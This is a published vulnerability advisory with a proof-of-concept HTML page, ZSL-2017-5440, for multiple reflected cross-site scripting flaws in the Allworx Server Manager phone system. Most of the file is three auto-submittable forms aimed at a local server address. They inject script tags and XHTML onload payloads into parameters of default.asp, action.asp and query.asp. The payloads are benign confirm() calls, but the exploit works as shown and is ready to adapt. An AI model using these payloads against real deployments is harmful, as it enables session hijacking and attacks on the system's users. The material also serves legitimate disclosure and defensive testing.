<!--


Allworx Server Manager Multiple Cross-Site Scripting Vulnerabilities


Vendor: Allworx Corporation
Product web page: https://www.allworx.com
Affected version: 6x, 6x12 and 48x

Summary: The Allworx phone system enables users to manage
voicemails in the Allworx Message Center and customize the
personal phone system configurations using My Allworx Manager.

Desc: Allworx server manager interface suffers from multiple
reflected XSS vulnerabilities when input passed via several
parameters to several scripts is not properly sanitized before
being returned to the user. This can be exploited to execute
arbitrary HTML and script code in a user&#039;s browser session in
context of an affected site.

Tested on: Microsoft Windows 10
           Server IST OIS


Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
                            @zeroscience


Advisory ID: ZSL-2017-5440
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5440.php


31.10.2017

-->


<html>
<head>
<title>Allworx Server Manager Multiple Cross-Site Scripting Vulnerabilities</title>
</head>

<body>
<script>history.pushState(&#039;&#039;, &#039;&#039;, &#039;/&#039;)</script>

<br />::: default.asp :::<br />
&nbps;&nbps;&nbps;&nbps;
&nbps;&nbps;&nbps;&nbps;
&nabla;

<form action="http://192.168.2.254/default.asp">
  <input type="hidden" name="Tab" value=&#039;MyConferences"><script>confirm(0)</script>&#039; />
  <input type="hidden" name="SessionID" value=&#039;0000"><script>confirm(1)</script>&#039; />
  <input type="hidden" name="Op" value="ModConf" />
  <input type="hidden" name="key" value=&#039;2"><script>confirm(2)</script>&#039; />
  <input type="submit" value="Submit request 1" />
</form>

<br />::: action.asp :::<br />
&nbps;&nbps;&nbps;&nbps;
&nbps;&nbps;&nbps;&nbps;
&nabla;

<form action="http://192.168.2.254/action.asp">
  <input type="hidden" name="action" value=&#039;selectActivePresence"><script>confirm(3)</script>&#039; />
  <input type="hidden" name="SessionID" value="zsl" />
  <input type="hidden" name="LoginName" value="admin" />
  <input type="hidden" name="Presence" value="0" />
  <input type="hidden" name="AnnounceOnlyIndices" value="" />
  <input type="submit" value="Submit request 2" />
</form>

<br />::: query.asp :::<br />
&nbps;&nbps;&nbps;&nbps;
&nbps;&nbps;&nbps;&nbps;
&nabla;

<form action="http://192.168.2.254/query.asp">
  <input type="hidden" name="query" value="RepQuery<a xmlns:a=&#039;http://www.w3.org/1999/xhtml&#039;><a:body onload=&#039;confirm(4)&#039;/></a>" />
  <input type="hidden" name="SessionID" value="251<a xmlns:a=&#039;http://www.w3.org/1999/xhtml&#039;><a:body onload=&#039;confirm(5)&#039;/></a>" />
  <input type="hidden" name="repName" value="SystemSettings" />
  <input type="hidden" name="fields" value="sysProfileName,hostLanTcpIpAddress,hostWanTcpIpAddress" />
  <input type="hidden" name="groupName" value="records<a xmlns:a=&#039;http://www.w3.org/1999/xhtml&#039;><a:body onload=&#039;confirm(6)&#039;/></a>" />
  <input type="hidden" name="recName" value="record<a xmlns:a=&#039;http://www.w3.org/1999/xhtml&#039;><a:body onload=&#039;confirm(7)&#039;/></a>" />
  <input type="hidden" name="rnd" value="20435" />
  <input type="submit" value="Submit request 3" />
</form>

</body>
</html>

